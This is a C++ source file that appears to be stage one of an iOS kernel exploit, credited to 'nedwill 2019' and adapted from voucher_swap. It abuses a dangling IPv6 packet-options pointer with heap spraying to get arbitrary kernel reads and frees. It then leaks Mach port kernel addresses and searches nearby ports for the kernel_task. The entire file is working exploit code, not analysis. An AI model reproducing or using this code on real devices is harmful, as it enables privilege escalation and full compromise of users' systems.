// <3 nedwill 2019
#include "stage1.h"

#include <unistd.h>

extern "C" {
#include "ipc_port.h"
#include "parameters.h"
}

#include "util.h"

const uint32_t kSprayCount = 256;


uint32_t getOffset()
{
#if __arm64e__
    return 0x368;
#else
    return 0x358;
#endif
}


// Number of spray attempts before giving up
const uint32_t kAttempts = 20;

// Pktinfo struct size. We use GetPktinfo/SetPktinfo to write this
// many bytes to the reclaimed pointer.
const uint32_t kPktinfoSize = sizeof(struct in6_pktinfo);

// Not tested on other sizes yet. Any size should work in theory
// as long as we can leak at least one arbitrary byte at a time.
static_assert(kPktinfoSize == 20, "unknown in6_pktinfo size");

StageOne::StageOne() {}

StageOne::~StageOne() {}

bool StageOne::FreeAddress(void *address) {
  return ReadFreeInternal(address, nullptr, /*freeing=*/true);
}

bool StageOne::Read20(void *address, uint8_t *data) {
  return ReadFreeInternal(address, data, /*freeing=*/false);
}

bool StageOne::ReadFreeInternal(void *address, uint8_t *data, bool freeing) {
  std::vector<std::unique_ptr<DanglingOptions>> dangling_options;
  for (int i = 0; i < 128; i++) {
    dangling_options.emplace_back(new DanglingOptions);
  }

  std::unique_ptr<uint8_t[]> buffer(new uint8_t[SIZE(ip6_pktopts)]);
  memset(buffer.get(), 0, SIZE(ip6_pktopts));

  // Set a pattern at the minmtu offset so we can check whether we reclaimed
  // the buffer.
  memset(buffer.get() + OFFSET(ip6_pktopts, ip6po_minmtu), 'B', 4);

  uint64_t address_uint = reinterpret_cast<uint64_t>(address);
  memcpy(buffer.get() + OFFSET(ip6_pktopts, ip6po_pktinfo), &address_uint,
         sizeof(uint64_t));

  for (uint32_t i = 0; i < kAttempts; i++) {
    if (!sprayer_.Spray(buffer.get(), static_cast<uint32_t>(SIZE(ip6_pktopts)),
                        kSprayCount)) {
      printf("Spray failed?\n");
      return false;
    }
    int minmtu = -1;
    for (uint32_t j = 0; j < dangling_options.size(); j++) {
      if (!dangling_options[j]->GetMinmtu(&minmtu)) {
        printf("Stage1: failed to GetMinmtu to detect leak\n");
        return false;
      }
      if (minmtu != 0x42424242) {
        // We don't see the 'B' pattern, keep looking
        usleep(10000);
        continue;
      }

      struct in6_pktinfo pktinfo = {};
      if (freeing) {
        if (!dangling_options[j]->SetPktinfo(&pktinfo)) {
          printf("Stage1: SetPktinfo failed\n");
          return false;
        }
      } else {
        if (!dangling_options[j]->GetPktinfo(&pktinfo)) {
          printf("Stage1: GetPktinfo failed\n");
          return false;
        }
        memcpy(data, &pktinfo, kPktinfoSize);
      }
      return true;
    }
  }

  return false;
}

bool StageOne::GetPortAddr(mach_port_t port, uint64_t *port_kaddr) {
  std::unique_ptr<DanglingOptions> dangling_options(new DanglingOptions());

  for (uint32_t i = 0; i < kAttempts; i++) {
    if (!sprayer_.SprayOOLPorts(SIZE(ip6_pktopts), port)) {
      printf("GetPortAddr: failed to spray\n");
      return false;
    }
    int minmtu = -1;
    if (!dangling_options->GetMinmtu(&minmtu)) {
      printf("GetPortAddr: failed to GetMinmtu to detect leak\n");
      return false;
    }
    int prefer_tempaddr = -1;
    if (!dangling_options->GetPreferTempaddr(&prefer_tempaddr)) {
      printf("GetPortAddr: failed to GetPreferTempaddr\n");
    }
    uint64_t maybe_port_kaddr = ((uint64_t)minmtu << 32) | prefer_tempaddr;
    if (!LooksLikeKaddr(maybe_port_kaddr)) {
      usleep(100000);
      continue;
    }

    *port_kaddr = maybe_port_kaddr;
    return true;
  }

  return false;
}

template <typename T> bool StageOne::Read(uint64_t addr, T *result) {
  static_assert(std::is_integral<T>::value, "Read type must be an integer");
  static_assert(sizeof(T) <= 20, "Read of type larger than 20 bytes");
  uint8_t buffer[20] = {};
  if (!Read20((void *)addr, buffer)) {
    return false;
  }

  *result = *reinterpret_cast<T *>(buffer);
  return true;
}

template <typename T>
bool StageOne::ReadMany(uint64_t addr, const std::vector<uint64_t> &offsets,
                        T *result) {
  static_assert(std::is_integral<T>::value, "Read type must be an integer");
  static_assert(sizeof(T) <= 20, "Read of type larger than 20 bytes");

  if (offsets.empty()) {
    return false;
  }

  uint64_t current_addr = addr;
  for (int i = 0; i < offsets.size() - 1; i++) {
    // Pointers are always size 64, so we can keep derefing uint64_ts.
    // We only need to use the final type for the last lookup.
    if (!Read<uint64_t>(current_addr + offsets[i], &current_addr)) {
      return false;
    }
  }

  return Read<T>(current_addr + offsets.back(), result);
}

bool StageOne::GetPipebufferAddr(uint64_t fd_ofiles, int fd,
                                 uint64_t *pipebuffer_ptr_kaddr,
                                 uint64_t *pipebuffer_kaddr) {
  std::vector<uint64_t> fd_ofiles_to_pipe_fg_data = {
      static_cast<uint64_t>(fd) * 8ul,
      OFFSET(fileproc, f_fglob),
      OFFSET(fileglob, fg_data),
  };

  uint64_t pipe_fg_data;
  if (!ReadMany<uint64_t>(fd_ofiles, fd_ofiles_to_pipe_fg_data,
                          &pipe_fg_data)) {
    return false;
  }

  *pipebuffer_ptr_kaddr = pipe_fg_data + OFFSET(pipe, pipe_buffer);
  if (!Read<uint64_t>(*pipebuffer_ptr_kaddr, pipebuffer_kaddr)) {
    return false;
  }

  return true;
}

// Adapted from voucher_swap
// Note that we are mixing failure to do kernel reads with "no" answers to
// the question of whether this port is the kernel_task port. We will log
// read failures so it's not a huge deal.
bool StageOne::GetKernelTaskFromPort(uint64_t port,
                                     uint64_t *kernel_task_address) {
  StageOne stage_one;

  uint32_t ip_bits;
  if (!stage_one.Read<uint32_t>(port + OFFSET(ipc_port, ip_bits), &ip_bits)) {
    printf("Failed to read ip_bits\n");
    return false;
  }

  if (ip_bits != io_makebits(1, IOT_PORT, IKOT_TASK)) {
    return false;
  }

  uint64_t task;
  if (!stage_one.Read<uint64_t>(port + OFFSET(ipc_port, ip_kobject), &task)) {
    printf("Failed to read task\n");
    return false;
  }

  std::vector<uint64_t> task_to_pid = {getOffset(),
                                       OFFSET(proc, p_pid)};

  uint32_t pid;
  if (!stage_one.ReadMany<uint32_t>(task, task_to_pid, &pid)) {
    printf("Failed to read pid\n");
    return false;
  }

  // The kernel task has pid 0.
  if (pid != 0) {
    return false;
  }

  *kernel_task_address = task;
  return true;
}

// From voucher_swap.
static void iterate_ipc_ports(size_t size, void (^callback)(size_t port_offset,
                                                            bool *stop)) {
  // Iterate through each block.
  size_t block_count = (size + BLOCK_SIZE(ipc_port) - 1) / BLOCK_SIZE(ipc_port);
  bool stop = false;
  for (size_t block = 0; !stop && block < block_count; block++) {
    // Iterate through each port in this block.
    size_t port_count = size / SIZE(ipc_port);
    if (port_count > COUNT_PER_BLOCK(ipc_port)) {
      port_count = COUNT_PER_BLOCK(ipc_port);
    }
    for (size_t port = 0; !stop && port < port_count; port++) {
      callback(BLOCK_SIZE(ipc_port) * block + SIZE(ipc_port) * port, &stop);
    }
    size -= BLOCK_SIZE(ipc_port);
  }
}

// Use Ian's trick of looking around near the host port to find the kernel_task
// port. Adapted from voucher_swap's implementation.
bool StageOne::GetKernelTaskFromHostPort(uint64_t host_port,
                                         uint64_t *kernel_task) {
  uint64_t port_block = host_port & ~(BLOCK_SIZE(ipc_port) - 1);
  iterate_ipc_ports(BLOCK_SIZE(ipc_port), ^(size_t port_offset, bool *stop) {
    uint64_t candidate_port = port_block + port_offset;
    bool found = GetKernelTaskFromPort(candidate_port, kernel_task);
    *stop = found;
  });
  return *kernel_task != 0;
}
